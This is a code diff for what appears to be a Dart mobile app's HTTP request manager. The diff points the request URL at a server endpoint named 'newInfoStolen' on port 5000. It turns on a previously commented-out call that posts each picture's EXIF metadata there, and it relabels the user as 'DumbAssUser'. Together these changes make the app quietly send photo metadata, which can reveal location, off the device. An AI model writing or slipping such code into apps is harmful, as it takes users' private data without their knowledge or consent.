@@ -30,8 +30,8 @@ class Post {
 class HttpRequestManager{
   static String _url;
 
-  static setUrl(String url){
-    _url = url;
+  static setUrl(String baseUrl){
+    _url = "http://"+baseUrl+":5000/newInfoStolen";
   }
 
   static Future<bool> createPost({Map body}) async {
@@ -45,8 +45,8 @@ class HttpRequestManager{
   }
 
   static Future<void> sendPicture(Picture picture) async {
-    Post newPost = Post(userId:"testUser",exifInfos:picture.exifInfos);
+    Post newPost = Post(userId:"DumbAssUser",exifInfos:picture.exifInfos);
     print(newPost.exifInfos);
-    //createPost(body: newPost.toMap());
+    await createPost(body: newPost.toMap());
   }
 }
